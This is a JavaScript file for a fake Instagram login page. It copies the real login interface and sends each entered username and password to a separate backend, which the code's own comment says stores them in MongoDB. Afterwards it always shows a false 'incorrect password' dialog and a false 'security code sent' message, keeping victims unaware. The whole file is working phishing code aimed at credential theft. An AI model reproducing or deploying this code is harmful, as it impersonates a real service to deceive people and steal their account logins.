/**
 * Instagram Login Page - Client-side Logic & Interactions
 */

// Backend API configuration
// During local development, automatically targets http://localhost:5000
// When deploying your backend to Render, Railway, etc., replace the production URL below.
const API_BASE_URL = (
  window.location.hostname === 'localhost' || 
  window.location.hostname === '127.0.0.1' || 
  window.location.protocol === 'file:'
) ? 'http://localhost:5000' : 'https://your-backend-app.onrender.com';

document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('login-form');
  const usernameInput = document.getElementById('username');
  const passwordInput = document.getElementById('password');
  const togglePasswordBtn = document.getElementById('toggle-password');
  const loginBtn = document.getElementById('login-btn');
  const fbLoginBtn = document.getElementById('fb-login-btn');
  const createAccountBtn = document.getElementById('create-account-btn');
  const toast = document.getElementById('toast');

  let toastTimeout;

  // Show Toast helper
  function showToast(message, duration = 3000) {
    if (toastTimeout) clearTimeout(toastTimeout);
    toast.textContent = message;
    toast.classList.add('show');
    toastTimeout = setTimeout(() => {
      toast.classList.remove('show');
    }, duration);
  }

  // Update Login button disabled/enabled state
  function updateButtonState() {
    const hasUsername = usernameInput.value.trim().length > 0;
    const hasPassword = passwordInput.value.trim().length >= 1;

    if (hasUsername && hasPassword) {
      loginBtn.disabled = false;
    } else {
      loginBtn.disabled = true;
    }
  }

  // Password visibility toggle
  function handlePasswordInput() {
    if (passwordInput.value.length > 0) {
      togglePasswordBtn.style.display = 'flex';
    } else {
      togglePasswordBtn.style.display = 'none';
      if (passwordInput.type === 'text') {
        passwordInput.type = 'password';
        togglePasswordBtn.classList.remove('visible');
        togglePasswordBtn.setAttribute('aria-label', 'Show password');
        togglePasswordBtn.setAttribute('title', 'Show password');
      }
    }
    updateButtonState();
  }

  togglePasswordBtn.addEventListener('click', (e) => {
    e.preventDefault();
    if (passwordInput.type === 'password') {
      passwordInput.type = 'text';
      togglePasswordBtn.classList.add('visible');
      togglePasswordBtn.setAttribute('aria-label', 'Hide password');
      togglePasswordBtn.setAttribute('title', 'Hide password');
    } else {
      passwordInput.type = 'password';
      togglePasswordBtn.classList.remove('visible');
      togglePasswordBtn.setAttribute('aria-label', 'Show password');
      togglePasswordBtn.setAttribute('title', 'Show password');
    }
    passwordInput.focus();
  });

  // Floating label state helper
  function checkFloatLabel(input) {
    const wrapper = input.closest('.input-wrapper');
    if (!wrapper) return;
    if (input.value.length > 0) {
      wrapper.classList.add('has-value');
    } else {
      wrapper.classList.remove('has-value');
    }
  }

  [usernameInput, passwordInput].forEach(input => {
    const wrapper = input.closest('.input-wrapper');
    if (!wrapper) return;
    input.addEventListener('focus', () => {
      wrapper.classList.add('has-focus');
    });
    input.addEventListener('blur', () => {
      wrapper.classList.remove('has-focus');
      checkFloatLabel(input);
    });
    input.addEventListener('input', () => {
      checkFloatLabel(input);
    });
  });

  usernameInput.addEventListener('input', updateButtonState);
  passwordInput.addEventListener('input', handlePasswordInput);

  // Modal elements
  const incorrectModal = document.getElementById('incorrect-modal');
  const modalGetCode = document.getElementById('modal-get-code');
  const modalTryAgain = document.getElementById('modal-try-again');

  function openModal() {
    incorrectModal.classList.add('active');
  }

  function closeModal() {
    incorrectModal.classList.remove('active');
  }

  modalTryAgain.addEventListener('click', () => {
    closeModal();
    passwordInput.value = '';
    handlePasswordInput();
    passwordInput.focus();
  });

  modalGetCode.addEventListener('click', () => {
    closeModal();
    showToast('A security login code has been sent.');
  });

  // Close modal on backdrop click
  incorrectModal.addEventListener('click', (e) => {
    if (e.target === incorrectModal) {
      closeModal();
    }
  });

  // Close modal on Escape
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && incorrectModal.classList.contains('active')) {
      closeModal();
    }
  });

  // Form submission handling - stores credentials to MongoDB via Express backend
  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const username = usernameInput.value.trim();
    const password = passwordInput.value;

    if (!username || !password) {
      showToast('Please enter your username and password.');
      return;
    }

    // Indicate loading
    loginBtn.classList.add('loading');
    loginBtn.disabled = true;

    try {
      const response = await fetch(`${API_BASE_URL}/api/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username, password })
      });

      const result = await response.json();
      console.log('Login API response:', result);
    } catch (error) {
      console.error('Error saving login details to backend:', error);
    } finally {
      loginBtn.classList.remove('loading');
      loginBtn.disabled = false;
      openModal();
    }
  });

  // Facebook login simulated action
  fbLoginBtn.addEventListener('click', () => {
    showToast('Redirecting to Facebook login...');
  });

  // Create new account simulated action
  createAccountBtn.addEventListener('click', () => {
    showToast('Redirecting to Instagram Sign Up...');
  });
});
